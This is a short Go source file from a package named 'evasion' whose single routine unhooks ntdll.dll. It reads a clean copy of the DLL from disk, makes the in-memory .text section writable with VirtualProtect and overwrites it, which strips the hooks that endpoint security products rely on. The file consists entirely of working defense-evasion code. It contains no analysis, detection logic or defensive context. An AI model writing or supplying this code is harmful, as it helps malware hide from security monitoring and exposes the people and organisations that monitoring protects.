package evasion

import (
	"fmt"
	"os"
	"unsafe"

	"github.com/saferwall/pe"
	"golang.org/x/sys/windows"
)

func unhookNtdll(ntdllBase uintptr) error {
	// 1. Load clean ntdll.dll from disk
	ntdllDisk, err := os.ReadFile("C:\\Windows\\System32\\ntdll.dll")
	if err != nil {
		return err
	}

	// 2. Parse PE headers of the disk version
	dosHeader := (*pe.ImageDosHeader)(unsafe.Pointer(&ntdllDisk[0]))
	ntHeader := (*pe.ImageNtHeaders64)(unsafe.Pointer(uintptr(unsafe.Pointer(&ntdllDisk[0])) + uintptr(dosHeader.AddressOfNewExeHeader)))

	// 3. Find the .text section
	numSections := ntHeader.FileHeader.NumberOfSections
	sectionHeaderPtr := uintptr(unsafe.Pointer(ntHeader)) + unsafe.Sizeof(*ntHeader)

	for i := uint16(0); i < numSections; i++ {
		section := (*pe.ImageSectionHeader)(unsafe.Pointer(sectionHeaderPtr + (uintptr(i) * unsafe.Sizeof(pe.ImageSectionHeader{}))))

		// Check for .text section
		sectionName := string(section.Name[:5])
		if sectionName == ".text" {
			// 4. Prepare addresses
			sourceAddress := uintptr(unsafe.Pointer(&ntdllDisk[0])) + uintptr(section.PointerToRawData)
			targetAddress := ntdllBase + uintptr(section.VirtualAddress)
			size := uintptr(section.SizeOfRawData)

			// 5. Change memory protection to PAGE_EXECUTE_READWRITE
			var oldProtect uint32
			err = windows.VirtualProtect(targetAddress, size, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
			if err != nil {
				return fmt.Errorf("VirtualProtect failed: %v", err)
			}

			// 6. Overwrite hooked memory with clean bytes
			copyMemory(targetAddress, sourceAddress, size)

			// 7. Restore original protection
			windows.VirtualProtect(targetAddress, size, oldProtect, &oldProtect)
			fmt.Printf("Successfully unhooked %s section at 0x%X\n", sectionName, targetAddress)
			break
		}
	}
	return nil
}

// Helper to copy memory directly
func copyMemory(dst, src, size uintptr) {
	for i := uintptr(0); i < size; i++ {
		*(*byte)(unsafe.Pointer(dst + i)) = *(*byte)(unsafe.Pointer(src + i))
	}
}
